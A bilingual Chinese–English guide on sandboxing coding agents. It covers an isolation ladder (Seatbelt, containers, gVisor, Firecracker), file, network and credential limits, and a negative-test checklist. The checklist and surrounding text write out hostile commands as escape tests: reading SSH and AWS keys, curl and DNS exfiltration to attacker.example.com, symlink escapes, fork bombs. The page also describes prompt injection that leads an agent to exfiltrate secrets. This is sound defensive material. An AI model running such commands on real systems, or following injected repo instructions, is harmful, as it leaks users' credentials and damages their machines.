coding agent 能运行任意 shell 命令——这是它强大的原因，也是它危险的原因。它可能因为 bug 误删文件，可能被仓库里一段藏在注释中的 prompt injection 诱导去读 `~/.ssh` 并发出去，也可能跑一个死循环把机器拖垮。沙箱的作用是：**即使 agent 做了错误的决定，造成的影响也被限制在可接受的范围内**。

这一页讲隔离技术的强度阶梯和四个限制维度。威胁模型和注入原理在 [Agent Security](/docs/agent/security) 讲过（尤其 Level 3），这里聚焦执行隔离的工程实现。

<Locale lang="en">

Coding agents can run arbitrary shell commands — the source of their power and their danger. A bug can delete files, a prompt injection hidden in a repo comment can steer the agent to read `~/.ssh` and send it out, and a runaway loop can exhaust the machine. A sandbox ensures that **even when the agent decides wrongly, the damage stays bounded**.

Threat models and injection are in [Agent Security](/docs/agent/security) (especially Level 3); this page focuses on implementation.

## Must know

- three harms: destruction, exfiltration, resource exhaustion; boundaries independent of model judgment
- isolation ladder: process permissions → OS sandbox (Seatbelt/bubblewrap) → container → gVisor → microVM (Firecracker)
- files: mount only the workspace; sensitive paths unreadable
- network: default deny + egress proxy allowlist; DNS is a channel too
- credentials: never inside; proxy-injected, short-lived, least privilege
- resources: CPU, memory, disk, processes, time
- a negative-test checklist

## Level 0 · 为什么需要沙箱

### coding agent 为什么需要沙箱？

| 伤害 | 例子 | 可能原因 |
| --- | --- | --- |
| 破坏 | `rm -rf` 删错目录；`git push --force` 覆盖远程；改了仓库外的配置 | 模型出错、理解偏差 |
| 泄露 | 读 `~/.aws/credentials`、`.env` 并通过 `curl` 发到外部 | **prompt injection**：仓库文件、issue、网页里藏着指令 |
| 资源耗尽 | 死循环、fork 炸弹、下载几十 GB 数据 | 模型出错、测试代码有 bug |

### 为什么权限确认不够？

[Agent Harness](/docs/ai-native/harness) Level 4 讲过权限分层。但用户确认有两个根本问题：

1. **确认疲劳**：一个任务弹 50 次确认，用户很快就会不看内容一路点“允许”。
2. **命令看不出意图**：`python scripts/setup.py` 看起来无害，但脚本里可能在读密钥并上传。用户无法审查每个命令的全部后果。

沙箱换了个思路：**与其逐条审批，不如划定一个边界，边界内随便做**。在边界内 agent 可以自主运行（减少确认），越界的操作会被系统直接拒绝——不管 agent 被怎么诱导。Anthropic 为 Claude Code 推出沙箱功能时就是这个理由：在保证安全的前提下大幅减少权限确认弹窗。

## Level 0 · Why

### Why do coding agents need sandboxes?

Destruction (wrong `rm -rf`, force pushes, edits outside the repo), exfiltration (reading credentials and sending them out — usually via prompt injection in files, issues, or pages), and resource exhaustion (loops, fork bombs, huge downloads).

### Why aren't permission prompts enough?

Approval fatigue — fifty prompts and users stop reading — and commands don't reveal intent (`python scripts/setup.py` may upload keys). A sandbox draws a boundary: free action inside, system-enforced denial outside regardless of how the agent was manipulated. That's why Claude Code's sandboxing could cut permission prompts substantially without lowering safety.

## Level 1 · 隔离强度阶梯

### OS 沙箱、容器、gVisor、microVM 有什么区别？

隔离强度从弱到强：

| 级别 | 技术 | 原理 | 适用 |
| --- | --- | --- | --- |
| 1 | 普通进程 + 用户权限 | 以当前用户身份运行，能访问用户的一切 | 无隔离（不推荐） |
| 2 | **OS 级沙箱** | macOS Seatbelt（`sandbox-exec`）、Linux bubblewrap / Landlock / seccomp：限制进程能访问的文件路径、系统调用、网络 | **本地开发机**：Claude Code 的沙箱就用 Seatbelt 和 bubblewrap，启动快、开销小 |
| 3 | **容器**（Docker） | Linux namespace 隔离文件系统、进程、网络视图；cgroup 限资源。**与宿主共享内核** | 开发容器、CI；隔离不可信代码时强度不够（内核漏洞可逃逸） |
| 4 | **gVisor** | 在用户态实现一个“应用内核”，拦截容器的系统调用，不直接交给宿主内核 | 需要比容器更强隔离，又想保留容器体验（如部分云沙箱服务） |
| 5 | **microVM**（Firecracker、Kata Containers） | 每个沙箱一个轻量虚拟机，有**独立内核**，启动只要百毫秒级 | **多租户云端运行不可信代码**：AWS Lambda 用 Firecracker；E2B 等 agent 沙箱服务也采用 microVM |
| 6 | 独立虚拟机 / 物理机 | 完全隔离 | 最高敏感度场景 |

选择原则：**隔离强度和信任程度匹配**。

- 本地 Claude Code 修你自己的仓库：OS 级沙箱足够（攻击面主要是“被注入后读你的密钥、外传数据”，文件和网络限制就能挡住）。
- 云端服务为成千上万个用户跑 agent：每个任务一个 microVM。容器共享内核，一个用户的代码利用内核漏洞就可能影响其他用户。

<Note type="danger" title="错误说法">

“放进 Docker 就安全了。”——容器默认配置下与宿主共享内核，常见配置还会挂载宿主目录、使用 root 用户、开放网络。对于多租户不可信代码，容器不是足够强的安全边界。

</Note>

## Level 1 · Isolation ladder

### OS sandbox vs container vs gVisor vs microVM?

Weakest to strongest: plain process with user permissions (no isolation); **OS sandboxes** (macOS Seatbelt, Linux bubblewrap/Landlock/seccomp — restrict paths, syscalls, network; fast; what Claude Code uses locally); **containers** (namespaces and cgroups but a **shared kernel** — fine for dev and CI, weak for untrusted multi-tenant code); **gVisor** (a user-space kernel intercepting syscalls); **microVMs** (Firecracker, Kata — a separate kernel per sandbox, ~100 ms boot; AWS Lambda and agent sandbox services like E2B); full VMs. Match isolation to trust: OS sandbox for your own repo locally; a microVM per task for multi-tenant cloud agents.

<Note type="danger" title="Wrong claim">

"It's in Docker, so it's safe." Shared kernel, often root, host mounts, open network.

</Note>

## Level 2 · 四个维度

### 如何限制 agent 只修改目标仓库？（文件）

| 规则 | 做法 |
| --- | --- |
| 只写工作区 | 只有任务仓库（或它的 worktree）可写；其余路径只读或不可见 |
| 敏感路径不可读 | `~/.ssh`、`~/.aws`、`~/.config/gh`、浏览器配置、其他项目目录：**连读都不允许** |
| 仓库内的敏感文件 | `.env`、密钥文件——用 deny 规则或干脆不放进沙箱的副本 |
| 防符号链接逃逸 | 解析真实路径后再判断，防止 `ln -s ~/.ssh ./keys` 绕过 |
| 云端 | 每个任务拿一份仓库的新副本，任务结束销毁 |

注意“只读”不够：泄露只需要**读**。

### 网络怎么限制？

网络是泄露的主要通道。原则：**默认拒绝，按需放行**。

```
agent 进程 ──► 出口代理（唯一出口）──► 白名单域名？
                                        ├─ pypi.org、registry.npmjs.org、github.com → 放行
                                        └─ 其他 → 拒绝并记录
```

- 所有出站流量必须经过代理，沙箱内不能直连外网。Claude Code 的沙箱就是通过代理实现域名白名单，访问新域名时请求用户确认。
- **白名单本身也可能被利用**：允许 `github.com` 意味着 agent 可以把数据推到攻击者的公开仓库或 gist。高敏感场景要细到路径、方法（如只允许 `GET` 包下载）。
- **别忘了 DNS**：查询 `<编码后的密钥>.attacker.com` 本身就能泄露数据。DNS 也应该经过受控的解析器。
- 包安装是“正当的网络需求”，可以通过内部镜像源满足，进一步收窄白名单。

### 如何调用必要 API 又不暴露密钥？（凭证）

核心原则：**密钥不进沙箱**。agent 能读到的任何东西，都可能被注入诱导泄露出去。

| 做法 | 原理 |
| --- | --- |
| **凭证代理（credential injection）** | agent 发出不带认证的请求；沙箱外的代理识别目标后**注入**认证头。agent 自始至终看不到密钥 |
| 短期、最小权限令牌 | 必须放进沙箱时，用只对这个仓库、只有需要的权限、几十分钟过期的令牌 |
| 不使用生产凭证 | 开发和测试用测试环境的账号；生产操作走需要人工批准的单独流程 |
| git 操作由外部完成 | agent 在沙箱内提交，推送和开 PR 由沙箱外的 harness 用自己的凭证完成 |

例子：agent 需要调用订单测试 API 跑集成测试。错误做法是把 `ORDER_API_KEY` 放进沙箱的环境变量；正确做法是沙箱代理对发往 `orders-test.internal` 的请求自动加上认证头。

### 资源怎么限制？

| 资源 | 限制 |
| --- | --- |
| CPU / 内存 | cgroup 配额，超了被限速或杀掉 |
| 磁盘 | 配额，防止写满 |
| 进程数 | 上限（防 fork 炸弹） |
| 时长 | 单命令超时 + 整个任务的最长时间 |
| 网络带宽 | 防止大量下载 / 上传 |

### 为什么把 harness 和 sandbox 分开设计？

harness 的权限判断（规则、分类器、用户确认）**依赖对命令意图的判断**，而意图可以被伪装、被注入。sandbox 不判断意图，只执行边界：读 `~/.ssh` 就是读不了，连 `attacker.com` 就是连不上。

**纵深防御**：harness 是第一道（大多数危险操作在这里被拦住），sandbox 是最后一道（harness 被绕过时止损）。两者要独立——如果 sandbox 的规则也由模型决定，就失去了意义。

<Note type="tip" title="串联：打破致命三要素">

[MCP](/docs/ai-native/mcp) Level 4 讲的致命三要素（私有数据 + 不可信内容 + 对外通信），沙箱直接打掉其中两条：文件限制让 agent 读不到私有数据，网络限制切断对外通信。

</Note>

## Level 2 · Four dimensions

### Files: how do you confine the agent to the repo?

Write only the workspace or worktree; make `~/.ssh`, `~/.aws`, `~/.config/gh`, browser profiles, and other projects **unreadable** — exfiltration needs only reads; exclude `.env` and key files; resolve real paths to block symlink escapes; in the cloud, use a fresh repo copy per task.

### Network?

Default deny; all egress through a proxy with a domain allowlist (how Claude Code's sandbox works, prompting for new domains). Allowlists can be abused — `github.com` allows pushing to an attacker's gist — so restrict paths and methods where sensitive. DNS can exfiltrate (`<encoded-secret>.attacker.com`), so control resolution. Serve packages from internal mirrors.

### Credentials: how do you call APIs without exposing keys?

Keys never enter the sandbox. A **credential proxy** outside injects auth headers so the agent never sees the secret; otherwise use short-lived, repo-scoped, least-privilege tokens; no production credentials; let the harness push and open PRs with its own credentials.

### Resources?

cgroup CPU/memory quotas, disk quotas, process limits against fork bombs, per-command and per-task timeouts, bandwidth caps.

### Why separate harness and sandbox?

Harness permissions judge intent, which injection can disguise. The sandbox enforces boundaries without judging intent. Defense in depth: harness first, sandbox last, independent of each other.

<Note type="tip" title="Breaking the trifecta">

File limits remove private-data access and network limits remove external communication — two legs of the lethal trifecta from [MCP](/docs/ai-native/mcp).

</Note>

## Level 3 · 验证

### 沙箱设计怎样用负例验证？

“配置文件里写了限制”不等于限制生效。要在沙箱里**主动尝试越界**，每一项都应该失败：

| 负例 | 期望 |
| --- | --- |
| `cat ~/.ssh/id_rsa`、`cat ~/.aws/credentials` | 拒绝 |
| `echo x > /etc/hosts`、写入仓库外目录 | 拒绝 |
| `ln -s ~/.ssh keys && cat keys/id_rsa` | 拒绝（符号链接逃逸） |
| `curl https://attacker.example.com` | 拒绝并记录 |
| `nslookup secret123.attacker.example.com` | 拒绝或不可达（DNS 外传） |
| `env` / `printenv` | 看不到任何密钥 |
| fork 炸弹、`dd` 写满磁盘、无限循环 | 被资源限制拦住，宿主不受影响 |
| 在仓库文件中植入注入指令，让 agent 尝试外传 | 外传失败，日志中有拒绝记录 |

把这些做成**自动化测试**，每次修改沙箱配置或升级底层组件时都运行。同时监控生产中的拒绝日志：频繁被拒的请求可能是正常需求（需要加白名单），也可能是攻击迹象。

## Level 3 · Verification

### How do you test a sandbox?

Configuration isn't enforcement. Actively attempt escapes, each of which must fail: reading SSH and cloud credentials, writing outside the workspace, symlink escapes, curl to an unlisted domain, DNS exfiltration lookups, environment dumps revealing secrets, fork bombs, disk fills and infinite loops, and an injected instruction in a repo file trying to exfiltrate. Automate these for every config change or component upgrade, and watch production denial logs — repeated denials are either legitimate needs or attacks.
